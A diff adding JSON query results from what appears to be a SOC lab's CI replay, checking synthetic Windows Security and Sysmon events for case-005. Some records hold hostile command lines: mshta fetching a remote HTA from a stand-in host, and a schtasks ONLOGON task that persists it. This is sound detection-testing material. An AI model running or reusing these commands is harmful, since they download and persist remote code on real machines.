+                "chunkRefsFetchTime": 0,
+                "congestionControlLatency": 0,
+                "pipelineWrapperFilteredLines": 0,
+                "dataobj": {
+                  "prePredicateDecompressedRows": 0,
+                  "prePredicateDecompressedBytes": 0,
+                  "prePredicateDecompressedStructuredMetadataBytes": 0,
+                  "postPredicateRows": 0,
+                  "postPredicateDecompressedBytes": 0,
+                  "postPredicateStructuredMetadataBytes": 0,
+                  "postFilterRows": 0,
+                  "pagesScanned": 0,
+                  "pagesDownloaded": 0,
+                  "pagesDownloadedBytes": 0,
+                  "pageBatches": 0,
+                  "totalRowsAvailable": 0,
+                  "totalPageDownloadTime": 0
+                }
+              },
+              "recvWaitTime": 0.000553
+            },
+            "cache": {
+              "chunk": {
+                "entriesFound": 1,
+                "entriesRequested": 1,
+                "entriesStored": 0,
+                "bytesReceived": 2186,
+                "bytesSent": 0,
+                "requests": 2,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "index": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "result": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "statsResult": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "volumeResult": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "seriesResult": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "labelResult": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "instantMetricResult": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              }
+            },
+            "index": {
+              "totalChunks": 0,
+              "postFilterChunks": 0,
+              "shardsDuration": 0,
+              "usedBloomFilters": false,
+              "totalStreams": 0,
+              "chunkRefsLookupTime": 0,
+              "bloomFilterTime": 0
+            }
+          }
+        }
+      }
+    },
+    {
+      "event_id": 4624,
+      "query": "{job=\"soclab\",case_id=\"case-005\",replay_run=\"ci-backend\",mode=\"replay_now\"} | json | event_id = 4624",
+      "expected": 1,
+      "observed": 1,
+      "response": {
+        "status": "success",
+        "data": {
+          "resultType": "streams",
+          "result": [
+            {
+              "stream": {
+                "case_id": "case-005",
+                "channel": "Security",
+                "command_line": "",
+                "destination_ip": "",
+                "event_data_IpAddress": "192.0.2.20",
+                "event_data_LogonGuid": "{9e175872-74a3-5c6d-882c-524c742cb7dc}",
+                "event_data_LogonType": "3",
+                "event_data_TargetDomainName": "LAB",
+                "event_data_TargetLogonId": "0x42",
+                "event_data_TargetUserName": "analyst.lab",
+                "event_id": "4624",
+                "event_uid": "0b9366e7aa994aac453e2a2878d70f8c6853fc4baae7f37d0934c15fe516edd3",
+                "host": "WS-CHAIN-LAB",
+                "image": "",
+                "ip": "192.0.2.20",
+                "job": "soclab",
+                "kind": "synthetic",
+                "logon_type": "3",
+                "mode": "replay_now",
+                "original_timestamp": "2026-09-03T10:00:05.000000Z",
+                "parent_guid": "",
+                "process_guid": "",
+                "provider": "Microsoft-Windows-Security-Auditing",
+                "record_id": "105",
+                "replay_mode": "replay_now",
+                "replay_run": "ci-backend",
+                "script_block": "",
+                "service_name": "soclab",
+                "source_line": "6",
+                "source_sha256": "c091ae65dc770ccbb76adbe62b678d768ad5e1c137e9849917619423876b4c53",
+                "target_user": "analyst.lab",
+                "user": ""
+              },
+              "values": [
+                [
+                  "1791296339064131700",
+                  "{\"channel\":\"Security\",\"command_line\":\"\",\"destination_ip\":\"\",\"event_data\":{\"IpAddress\":\"192.0.2.20\",\"LogonGuid\":\"{9e175872-74a3-5c6d-882c-524c742cb7dc}\",\"LogonType\":\"3\",\"TargetDomainName\":\"LAB\",\"TargetLogonId\":\"0x42\",\"TargetUserName\":\"analyst.lab\"},\"event_id\":4624,\"event_uid\":\"0b9366e7aa994aac453e2a2878d70f8c6853fc4baae7f37d0934c15fe516edd3\",\"host\":\"WS-CHAIN-LAB\",\"image\":\"\",\"ip\":\"192.0.2.20\",\"logon_type\":\"3\",\"original_timestamp\":\"2026-09-03T10:00:05.000000Z\",\"parent_guid\":\"\",\"process_guid\":\"\",\"provider\":\"Microsoft-Windows-Security-Auditing\",\"record_id\":105,\"replay_mode\":\"replay_now\",\"script_block\":\"\",\"source_line\":6,\"source_sha256\":\"c091ae65dc770ccbb76adbe62b678d768ad5e1c137e9849917619423876b4c53\",\"target_user\":\"analyst.lab\",\"user\":\"\"}"
+                ]
+              ]
+            }
+          ],
+          "stats": {
+            "summary": {
+              "bytesProcessedPerSecond": 887780,
+              "linesProcessedPerSecond": 1016,
+              "totalBytesProcessed": 9608,
+              "totalLinesProcessed": 11,
+              "execTime": 0.010823,
+              "queueTime": 0.000541,
+              "subqueries": 0,
+              "totalEntriesReturned": 1,
+              "splits": 0,
+              "shards": 0,
+              "totalPostFilterLines": 1,
+              "totalStructuredMetadataBytesProcessed": 110
+            },
+            "querier": {
+              "store": {
+                "totalChunksRef": 1,
+                "totalChunksDownloaded": 1,
+                "chunksDownloadTime": 0,
+                "queryReferencedStructuredMetadata": false,
+                "queryUsedV2Engine": false,
+                "chunk": {
+                  "headChunkBytes": 0,
+                  "headChunkLines": 0,
+                  "decompressedBytes": 9608,
+                  "decompressedLines": 11,
+                  "compressedBytes": 1796,
+                  "totalDuplicates": 0,
+                  "postFilterLines": 1,
+                  "headChunkStructuredMetadataBytes": 0,
+                  "decompressedStructuredMetadataBytes": 110
+                },
+                "chunkRefsFetchTime": 0,
+                "congestionControlLatency": 0,
+                "pipelineWrapperFilteredLines": 0,
+                "dataobj": {
+                  "prePredicateDecompressedRows": 0,
+                  "prePredicateDecompressedBytes": 0,
+                  "prePredicateDecompressedStructuredMetadataBytes": 0,
+                  "postPredicateRows": 0,
+                  "postPredicateDecompressedBytes": 0,
+                  "postPredicateStructuredMetadataBytes": 0,
+                  "postFilterRows": 0,
+                  "pagesScanned": 0,
+                  "pagesDownloaded": 0,
+                  "pagesDownloadedBytes": 0,
+                  "pageBatches": 0,
+                  "totalRowsAvailable": 0,
+                  "totalPageDownloadTime": 0
+                }
+              },
+              "querierExecTime": 0.001191
+            },
+            "ingester": {
+              "totalReached": 1,
+              "totalChunksMatched": 0,
+              "totalBatches": 1,
+              "totalLinesSent": 0,
+              "store": {
+                "totalChunksRef": 0,
+                "totalChunksDownloaded": 0,
+                "chunksDownloadTime": 0,
+                "queryReferencedStructuredMetadata": false,
+                "queryUsedV2Engine": false,
+                "chunk": {
+                  "headChunkBytes": 0,
+                  "headChunkLines": 0,
+                  "decompressedBytes": 0,
+                  "decompressedLines": 0,
+                  "compressedBytes": 0,
+                  "totalDuplicates": 0,
+                  "postFilterLines": 0,
+                  "headChunkStructuredMetadataBytes": 0,
+                  "decompressedStructuredMetadataBytes": 0
+                },
+                "chunkRefsFetchTime": 0,
+                "congestionControlLatency": 0,
+                "pipelineWrapperFilteredLines": 0,
+                "dataobj": {
+                  "prePredicateDecompressedRows": 0,
+                  "prePredicateDecompressedBytes": 0,
+                  "prePredicateDecompressedStructuredMetadataBytes": 0,
+                  "postPredicateRows": 0,
+                  "postPredicateDecompressedBytes": 0,
+                  "postPredicateStructuredMetadataBytes": 0,
+                  "postFilterRows": 0,
+                  "pagesScanned": 0,
+                  "pagesDownloaded": 0,
+                  "pagesDownloadedBytes": 0,
+                  "pageBatches": 0,
+                  "totalRowsAvailable": 0,
+                  "totalPageDownloadTime": 0
+                }
+              }
+            },
+            "cache": {
+              "chunk": {
+                "entriesFound": 1,
+                "entriesRequested": 1,
+                "entriesStored": 0,
+                "bytesReceived": 2186,
+                "bytesSent": 0,
+                "requests": 2,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "index": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "result": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "statsResult": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "volumeResult": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "seriesResult": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "labelResult": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "instantMetricResult": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              }
+            },
+            "index": {
+              "totalChunks": 0,
+              "postFilterChunks": 0,
+              "shardsDuration": 0,
+              "usedBloomFilters": false,
+              "totalStreams": 0,
+              "chunkRefsLookupTime": 0,
+              "bloomFilterTime": 0
+            }
+          }
+        }
+      }
+    },
+    {
+      "event_id": 1,
+      "query": "{job=\"soclab\",case_id=\"case-005\",replay_run=\"ci-backend\",mode=\"replay_now\"} | json | event_id = 1",
+      "expected": 3,
+      "observed": 3,
+      "response": {
+        "status": "success",
+        "data": {
+          "resultType": "streams",
+          "result": [
+            {
+              "stream": {
+                "case_id": "case-005",
+                "channel": "Microsoft-Windows-Sysmon/Operational",
+                "command_line": "cmd.exe /c mshta.exe https://payload.example.invalid/stage.hta",
+                "destination_ip": "",
+                "event_data_CommandLine": "cmd.exe /c mshta.exe https://payload.example.invalid/stage.hta",
+                "event_data_Image": "C:\\Windows\\System32\\cmd.exe",
+                "event_data_LogonGuid": "{9e175872-74a3-5c6d-882c-524c742cb7dc}",
+                "event_data_LogonId": "0x42",
+                "event_data_ParentProcessGuid": "{00000000-0000-0000-0000-000000000000}",
+                "event_data_ProcessGuid": "{ac333bb9-aa2e-5082-938a-2c0dee8262a1}",
+                "event_data_ProcessId": "4000",
+                "event_data_User": "LAB\\analyst.lab",
+                "event_id": "1",
+                "event_uid": "bc8ba65d53680a499a7c1888f19ee64d01ac8105bcaff433b3c16a8ea9674ff6",
+                "host": "WS-CHAIN-LAB",
+                "image": "C:\\Windows\\System32\\cmd.exe",
+                "ip": "",
+                "job": "soclab",
+                "kind": "synthetic",
+                "logon_type": "",
+                "mode": "replay_now",
+                "original_timestamp": "2026-09-03T10:00:06.000000Z",
+                "parent_guid": "{00000000-0000-0000-0000-000000000000}",
+                "process_guid": "{ac333bb9-aa2e-5082-938a-2c0dee8262a1}",
+                "provider": "Microsoft-Windows-Sysmon",
+                "record_id": "106",
+                "replay_mode": "replay_now",
+                "replay_run": "ci-backend",
+                "script_block": "",
+                "service_name": "soclab",
+                "source_line": "1",
+                "source_sha256": "8fadc59ed82f68fde96b8ecb96c2225ae46f0e79aea1afc44be0f72e0dab823d",
+                "target_user": "",
+                "user": "LAB\\analyst.lab"
+              },
+              "values": [
+                [
+                  "1791296339064132700",
+                  "{\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"command_line\":\"cmd.exe /c mshta.exe https://payload.example.invalid/stage.hta\",\"destination_ip\":\"\",\"event_data\":{\"CommandLine\":\"cmd.exe /c mshta.exe https://payload.example.invalid/stage.hta\",\"Image\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"LogonGuid\":\"{9e175872-74a3-5c6d-882c-524c742cb7dc}\",\"LogonId\":\"0x42\",\"ParentProcessGuid\":\"{00000000-0000-0000-0000-000000000000}\",\"ProcessGuid\":\"{ac333bb9-aa2e-5082-938a-2c0dee8262a1}\",\"ProcessId\":\"4000\",\"User\":\"LAB\\\\analyst.lab\"},\"event_id\":1,\"event_uid\":\"bc8ba65d53680a499a7c1888f19ee64d01ac8105bcaff433b3c16a8ea9674ff6\",\"host\":\"WS-CHAIN-LAB\",\"image\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"ip\":\"\",\"logon_type\":\"\",\"original_timestamp\":\"2026-09-03T10:00:06.000000Z\",\"parent_guid\":\"{00000000-0000-0000-0000-000000000000}\",\"process_guid\":\"{ac333bb9-aa2e-5082-938a-2c0dee8262a1}\",\"provider\":\"Microsoft-Windows-Sysmon\",\"record_id\":106,\"replay_mode\":\"replay_now\",\"script_block\":\"\",\"source_line\":1,\"source_sha256\":\"8fadc59ed82f68fde96b8ecb96c2225ae46f0e79aea1afc44be0f72e0dab823d\",\"target_user\":\"\",\"user\":\"LAB\\\\analyst.lab\"}"
+                ]
+              ]
+            },
+            {
+              "stream": {
+                "case_id": "case-005",
+                "channel": "Microsoft-Windows-Sysmon/Operational",
+                "command_line": "mshta.exe https://payload.example.invalid/stage.hta",
+                "destination_ip": "",
+                "event_data_CommandLine": "mshta.exe https://payload.example.invalid/stage.hta",
+                "event_data_Image": "C:\\Windows\\System32\\mshta.exe",
+                "event_data_LogonGuid": "{9e175872-74a3-5c6d-882c-524c742cb7dc}",
+                "event_data_LogonId": "0x42",
+                "event_data_ParentProcessGuid": "{ac333bb9-aa2e-5082-938a-2c0dee8262a1}",
+                "event_data_ProcessGuid": "{f778258b-2409-596c-9c79-f0ab1770249d}",
+                "event_data_ProcessId": "4001",
+                "event_data_User": "LAB\\analyst.lab",
+                "event_id": "1",
+                "event_uid": "8cf28a0658eecb79c373fdb509d45407ab1d4c461a3af6653d012608910c341c",
+                "host": "WS-CHAIN-LAB",
+                "image": "C:\\Windows\\System32\\mshta.exe",
+                "ip": "",
+                "job": "soclab",
+                "kind": "synthetic",
+                "logon_type": "",
+                "mode": "replay_now",
+                "original_timestamp": "2026-09-03T10:00:07.000000Z",
+                "parent_guid": "{ac333bb9-aa2e-5082-938a-2c0dee8262a1}",
+                "process_guid": "{f778258b-2409-596c-9c79-f0ab1770249d}",
+                "provider": "Microsoft-Windows-Sysmon",
+                "record_id": "107",
+                "replay_mode": "replay_now",
+                "replay_run": "ci-backend",
+                "script_block": "",
+                "service_name": "soclab",
+                "source_line": "2",
+                "source_sha256": "8fadc59ed82f68fde96b8ecb96c2225ae46f0e79aea1afc44be0f72e0dab823d",
+                "target_user": "",
+                "user": "LAB\\analyst.lab"
+              },
+              "values": [
+                [
+                  "1791296339064133700",
+                  "{\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"command_line\":\"mshta.exe https://payload.example.invalid/stage.hta\",\"destination_ip\":\"\",\"event_data\":{\"CommandLine\":\"mshta.exe https://payload.example.invalid/stage.hta\",\"Image\":\"C:\\\\Windows\\\\System32\\\\mshta.exe\",\"LogonGuid\":\"{9e175872-74a3-5c6d-882c-524c742cb7dc}\",\"LogonId\":\"0x42\",\"ParentProcessGuid\":\"{ac333bb9-aa2e-5082-938a-2c0dee8262a1}\",\"ProcessGuid\":\"{f778258b-2409-596c-9c79-f0ab1770249d}\",\"ProcessId\":\"4001\",\"User\":\"LAB\\\\analyst.lab\"},\"event_id\":1,\"event_uid\":\"8cf28a0658eecb79c373fdb509d45407ab1d4c461a3af6653d012608910c341c\",\"host\":\"WS-CHAIN-LAB\",\"image\":\"C:\\\\Windows\\\\System32\\\\mshta.exe\",\"ip\":\"\",\"logon_type\":\"\",\"original_timestamp\":\"2026-09-03T10:00:07.000000Z\",\"parent_guid\":\"{ac333bb9-aa2e-5082-938a-2c0dee8262a1}\",\"process_guid\":\"{f778258b-2409-596c-9c79-f0ab1770249d}\",\"provider\":\"Microsoft-Windows-Sysmon\",\"record_id\":107,\"replay_mode\":\"replay_now\",\"script_block\":\"\",\"source_line\":2,\"source_sha256\":\"8fadc59ed82f68fde96b8ecb96c2225ae46f0e79aea1afc44be0f72e0dab823d\",\"target_user\":\"\",\"user\":\"LAB\\\\analyst.lab\"}"
+                ]
+              ]
+            },
+            {
+              "stream": {
+                "case_id": "case-005",
+                "channel": "Microsoft-Windows-Sysmon/Operational",
+                "command_line": "schtasks.exe /Create /SC ONLOGON /TN LabUpdater /TR \"mshta.exe https://payload.example.invalid/stage.hta\"",
+                "destination_ip": "",
+                "event_data_CommandLine": "schtasks.exe /Create /SC ONLOGON /TN LabUpdater /TR \"mshta.exe https://payload.example.invalid/stage.hta\"",
+                "event_data_Image": "C:\\Windows\\System32\\schtasks.exe",
+                "event_data_LogonGuid": "{9e175872-74a3-5c6d-882c-524c742cb7dc}",
+                "event_data_LogonId": "0x42",
+                "event_data_ParentProcessGuid": "{f778258b-2409-596c-9c79-f0ab1770249d}",
+                "event_data_ProcessGuid": "{582945ac-4be3-5081-ab8d-39ed62d01823}",
+                "event_data_ProcessId": "4002",
+                "event_data_User": "LAB\\analyst.lab",
+                "event_id": "1",
+                "event_uid": "42ae87bb3476153ff7f2257ac8949922b6f02b1d20cb7f6b2885ae35c7000fb1",
+                "host": "WS-CHAIN-LAB",
+                "image": "C:\\Windows\\System32\\schtasks.exe",
+                "ip": "",
+                "job": "soclab",
+                "kind": "synthetic",
+                "logon_type": "",
+                "mode": "replay_now",
+                "original_timestamp": "2026-09-03T10:00:09.000000Z",
+                "parent_guid": "{f778258b-2409-596c-9c79-f0ab1770249d}",
+                "process_guid": "{582945ac-4be3-5081-ab8d-39ed62d01823}",
+                "provider": "Microsoft-Windows-Sysmon",
+                "record_id": "109",
+                "replay_mode": "replay_now",
+                "replay_run": "ci-backend",
+                "script_block": "",
+                "service_name": "soclab",
+                "source_line": "4",
+                "source_sha256": "8fadc59ed82f68fde96b8ecb96c2225ae46f0e79aea1afc44be0f72e0dab823d",
+                "target_user": "",
+                "user": "LAB\\analyst.lab"
+              },
+              "values": [
+                [
+                  "1791296339064135700",
+                  "{\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"command_line\":\"schtasks.exe /Create /SC ONLOGON /TN LabUpdater /TR \\\"mshta.exe https://payload.example.invalid/stage.hta\\\"\",\"destination_ip\":\"\",\"event_data\":{\"CommandLine\":\"schtasks.exe /Create /SC ONLOGON /TN LabUpdater /TR \\\"mshta.exe https://payload.example.invalid/stage.hta\\\"\",\"Image\":\"C:\\\\Windows\\\\System32\\\\schtasks.exe\",\"LogonGuid\":\"{9e175872-74a3-5c6d-882c-524c742cb7dc}\",\"LogonId\":\"0x42\",\"ParentProcessGuid\":\"{f778258b-2409-596c-9c79-f0ab1770249d}\",\"ProcessGuid\":\"{582945ac-4be3-5081-ab8d-39ed62d01823}\",\"ProcessId\":\"4002\",\"User\":\"LAB\\\\analyst.lab\"},\"event_id\":1,\"event_uid\":\"42ae87bb3476153ff7f2257ac8949922b6f02b1d20cb7f6b2885ae35c7000fb1\",\"host\":\"WS-CHAIN-LAB\",\"image\":\"C:\\\\Windows\\\\System32\\\\schtasks.exe\",\"ip\":\"\",\"logon_type\":\"\",\"original_timestamp\":\"2026-09-03T10:00:09.000000Z\",\"parent_guid\":\"{f778258b-2409-596c-9c79-f0ab1770249d}\",\"process_guid\":\"{582945ac-4be3-5081-ab8d-39ed62d01823}\",\"provider\":\"Microsoft-Windows-Sysmon\",\"record_id\":109,\"replay_mode\":\"replay_now\",\"script_block\":\"\",\"source_line\":4,\"source_sha256\":\"8fadc59ed82f68fde96b8ecb96c2225ae46f0e79aea1afc44be0f72e0dab823d\",\"target_user\":\"\",\"user\":\"LAB\\\\analyst.lab\"}"
+                ]
+              ]
+            }
+          ],
+          "stats": {
+            "summary": {
+              "bytesProcessedPerSecond": 5957341,
+              "linesProcessedPerSecond": 6820,
+              "totalBytesProcessed": 9608,
+              "totalLinesProcessed": 11,
+              "execTime": 0.001613,
+              "queueTime": 0,
+              "subqueries": 0,
+              "totalEntriesReturned": 3,
+              "splits": 0,
+              "shards": 0,
+              "totalPostFilterLines": 3,
+              "totalStructuredMetadataBytesProcessed": 110
+            },
+            "querier": {
+              "store": {
+                "totalChunksRef": 1,
+                "totalChunksDownloaded": 1,
+                "chunksDownloadTime": 0,
+                "queryReferencedStructuredMetadata": false,
+                "queryUsedV2Engine": false,
+                "chunk": {
+                  "headChunkBytes": 0,
+                  "headChunkLines": 0,
+                  "decompressedBytes": 9608,
+                  "decompressedLines": 11,
+                  "compressedBytes": 1796,
+                  "totalDuplicates": 0,
+                  "postFilterLines": 3,
+                  "headChunkStructuredMetadataBytes": 0,
+                  "decompressedStructuredMetadataBytes": 110
+                },
+                "chunkRefsFetchTime": 0,
+                "congestionControlLatency": 0,
+                "pipelineWrapperFilteredLines": 0,
+                "dataobj": {
+                  "prePredicateDecompressedRows": 0,
+                  "prePredicateDecompressedBytes": 0,
+                  "prePredicateDecompressedStructuredMetadataBytes": 0,
+                  "postPredicateRows": 0,
+                  "postPredicateDecompressedBytes": 0,
+                  "postPredicateStructuredMetadataBytes": 0,
+                  "postFilterRows": 0,
+                  "pagesScanned": 0,
+                  "pagesDownloaded": 0,
+                  "pagesDownloadedBytes": 0,
+                  "pageBatches": 0,
+                  "totalRowsAvailable": 0,
+                  "totalPageDownloadTime": 0
+                }
+              },
+              "querierExecTime": 0.000714
+            },
+            "ingester": {
+              "totalReached": 1,
+              "totalChunksMatched": 0,
+              "totalBatches": 1,
+              "totalLinesSent": 0,
+              "store": {
+                "totalChunksRef": 0,
+                "totalChunksDownloaded": 0,
+                "chunksDownloadTime": 0,
+                "queryReferencedStructuredMetadata": false,
+                "queryUsedV2Engine": false,
+                "chunk": {
+                  "headChunkBytes": 0,
+                  "headChunkLines": 0,
+                  "decompressedBytes": 0,
+                  "decompressedLines": 0,
+                  "compressedBytes": 0,
+                  "totalDuplicates": 0,
+                  "postFilterLines": 0,
+                  "headChunkStructuredMetadataBytes": 0,
+                  "decompressedStructuredMetadataBytes": 0
+                },
+                "chunkRefsFetchTime": 0,
+                "congestionControlLatency": 0,
+                "pipelineWrapperFilteredLines": 0,
+                "dataobj": {
+                  "prePredicateDecompressedRows": 0,
+                  "prePredicateDecompressedBytes": 0,
+                  "prePredicateDecompressedStructuredMetadataBytes": 0,
+                  "postPredicateRows": 0,
+                  "postPredicateDecompressedBytes": 0,
+                  "postPredicateStructuredMetadataBytes": 0,
+                  "postFilterRows": 0,
+                  "pagesScanned": 0,
+                  "pagesDownloaded": 0,
+                  "pagesDownloadedBytes": 0,
+                  "pageBatches": 0,
+                  "totalRowsAvailable": 0,
+                  "totalPageDownloadTime": 0
+                }
+              },
+              "recvWaitTime": 0.000714
+            },
+            "cache": {
+              "chunk": {
+                "entriesFound": 1,
+                "entriesRequested": 1,
+                "entriesStored": 0,
+                "bytesReceived": 2186,
+                "bytesSent": 0,
+                "requests": 2,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "index": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "result": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "statsResult": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "volumeResult": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "seriesResult": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "labelResult": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "instantMetricResult": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              }
+            },
+            "index": {
+              "totalChunks": 0,
+              "postFilterChunks": 0,
+              "shardsDuration": 0,
+              "usedBloomFilters": false,
+              "totalStreams": 0,
+              "chunkRefsLookupTime": 0,
+              "bloomFilterTime": 0
+            }
+          }
+        }
+      }
+    },
+    {
+      "event_id": 3,
+      "query": "{job=\"soclab\",case_id=\"case-005\",replay_run=\"ci-backend\",mode=\"replay_now\"} | json | event_id = 3",
+      "expected": 1,
+      "observed": 1,
+      "response": {
+        "status": "success",
+        "data": {
+          "resultType": "streams",
+          "result": [
+            {
+              "stream": {
+                "case_id": "case-005",
+                "channel": "Microsoft-Windows-Sysmon/Operational",
+                "command_line": "",
+                "destination_ip": "198.51.100.20",
+                "event_data_DestinationIp": "198.51.100.20",
+                "event_data_DestinationPort": "443",
+                "event_data_Image": "C:\\Windows\\System32\\mshta.exe",
+                "event_data_Initiated": "true",
+                "event_data_ProcessGuid": "{f778258b-2409-596c-9c79-f0ab1770249d}",
+                "event_data_Protocol": "tcp",
+                "event_id": "3",
+                "event_uid": "bc9eaff475de5e378939be8e751f5fc65e3c9c0fc61030fd810b0edbe9b59ce9",
+                "host": "WS-CHAIN-LAB",
+                "image": "C:\\Windows\\System32\\mshta.exe",
+                "ip": "",
+                "job": "soclab",
+                "kind": "synthetic",
+                "logon_type": "",
+                "mode": "replay_now",
+                "original_timestamp": "2026-09-03T10:00:08.000000Z",
+                "parent_guid": "",
+                "process_guid": "{f778258b-2409-596c-9c79-f0ab1770249d}",
+                "provider": "Microsoft-Windows-Sysmon",
+                "record_id": "108",
+                "replay_mode": "replay_now",
+                "replay_run": "ci-backend",
+                "script_block": "",
+                "service_name": "soclab",
+                "source_line": "3",
+                "source_sha256": "8fadc59ed82f68fde96b8ecb96c2225ae46f0e79aea1afc44be0f72e0dab823d",
+                "target_user": "",
+                "user": ""
+              },
+              "values": [
+                [
+                  "1791296339064134700",
+                  "{\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"command_line\":\"\",\"destination_ip\":\"198.51.100.20\",\"event_data\":{\"DestinationIp\":\"198.51.100.20\",\"DestinationPort\":\"443\",\"Image\":\"C:\\\\Windows\\\\System32\\\\mshta.exe\",\"Initiated\":\"true\",\"ProcessGuid\":\"{f778258b-2409-596c-9c79-f0ab1770249d}\",\"Protocol\":\"tcp\"},\"event_id\":3,\"event_uid\":\"bc9eaff475de5e378939be8e751f5fc65e3c9c0fc61030fd810b0edbe9b59ce9\",\"host\":\"WS-CHAIN-LAB\",\"image\":\"C:\\\\Windows\\\\System32\\\\mshta.exe\",\"ip\":\"\",\"logon_type\":\"\",\"original_timestamp\":\"2026-09-03T10:00:08.000000Z\",\"parent_guid\":\"\",\"process_guid\":\"{f778258b-2409-596c-9c79-f0ab1770249d}\",\"provider\":\"Microsoft-Windows-Sysmon\",\"record_id\":108,\"replay_mode\":\"replay_now\",\"script_block\":\"\",\"source_line\":3,\"source_sha256\":\"8fadc59ed82f68fde96b8ecb96c2225ae46f0e79aea1afc44be0f72e0dab823d\",\"target_user\":\"\",\"user\":\"\"}"
+                ]
+              ]
+            }
+          ],
+          "stats": {
+            "summary": {
+              "bytesProcessedPerSecond": 4387414,
+              "linesProcessedPerSecond": 5023,
+              "totalBytesProcessed": 9608,
+              "totalLinesProcessed": 11,
+              "execTime": 0.00219,
+              "queueTime": 0.00077,
+              "subqueries": 0,
+              "totalEntriesReturned": 1,
+              "splits": 0,
+              "shards": 0,
+              "totalPostFilterLines": 1,
+              "totalStructuredMetadataBytesProcessed": 110
+            },
+            "querier": {
+              "store": {
+                "totalChunksRef": 1,
+                "totalChunksDownloaded": 1,
+                "chunksDownloadTime": 0,
+                "queryReferencedStructuredMetadata": false,
+                "queryUsedV2Engine": false,
+                "chunk": {
+                  "headChunkBytes": 0,
+                  "headChunkLines": 0,
+                  "decompressedBytes": 9608,
+                  "decompressedLines": 11,
+                  "compressedBytes": 1796,
+                  "totalDuplicates": 0,
+                  "postFilterLines": 1,
+                  "headChunkStructuredMetadataBytes": 0,
+                  "decompressedStructuredMetadataBytes": 110
+                },
